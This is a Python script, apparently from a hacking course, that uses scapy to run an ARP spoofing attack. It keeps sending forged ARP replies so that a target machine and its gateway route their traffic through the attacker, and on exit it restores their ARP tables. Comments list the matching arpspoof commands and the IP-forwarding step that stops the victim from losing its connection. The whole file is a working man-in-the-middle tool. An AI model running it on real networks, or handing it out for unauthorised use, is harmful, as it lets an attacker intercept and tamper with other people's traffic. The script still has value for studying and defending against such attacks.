#!/usr/bin/env python

# arp -a
# route -n --> router ip
# arpspoof -i [interface] -t [target ip] [gateway ip], fool the target
# arpspoof -i [interface] -t [gateway ip] [target ip], fool the router
# echo 1 > /proc/sys/net/ipv4/ip_forward, enable port forwarding (Linux security feature)

import scapy.all as scapy
import optparse
import time
import sys


def get_arguments():
    parser = optparse.OptionParser()
    # parser.add_option("-i", "--interface", dest="interface", help="")
    # parser.add_option("-t", "--target", dest="target", action="append", nargs=2, help="Target machine to be spoofed.")
    parser.add_option("-t", "--target", dest="target", help="Target machine to be spoofed.")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway to be spoofed.")
    (options, arguments) = parser.parse_args()
    if not options.target:
        print("[-] Please specify the target machine.")
    if not options.gateway:
        print("[-] Please specify the gateway.")
    return options

def arp_spoof(target_ip, spoof_ip):
    # need to send packets continuously to fool targets

    # op=1(default)-->arp request, op=2-->arp response, default=(hwsrc=localhost_MAC)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    # return only one element (packet sent, answer)
    return answered_list[0][1].hwsrc

def dynamic_print_v2(sent_packet_count):
    # python2, print(), --> buffer, print start from \r 
    print("\r[+] Packets sent: " + str(sent_packet_count)),
    sys.stdout.flush()
    
    time.sleep(2)

def dynamic_print_v3(sent_packet_count):
    # python3, end="add anything to the statement, default:\n"
    print("\r[+] Packets sent: " + str(sent_packet_count), end="")
    time.sleep(2)

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False, count=4)

options = get_arguments()
sent_packet_count = 0
ver = sys.version_info.major

try:
    while True:
        arp_spoof(options.target, options.gateway)
        arp_spoof(options.gateway, options.target)
        sent_packet_count += 2
        # if ver == 3:
        dynamic_print_v3(sent_packet_count)
        # else:
        # dynamic_print_v2(sent_packet_count)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)

# need to set --> echo 1 > /proc/sys/net/ipv4/ip_forward
# otherwise the target machine will lost network connection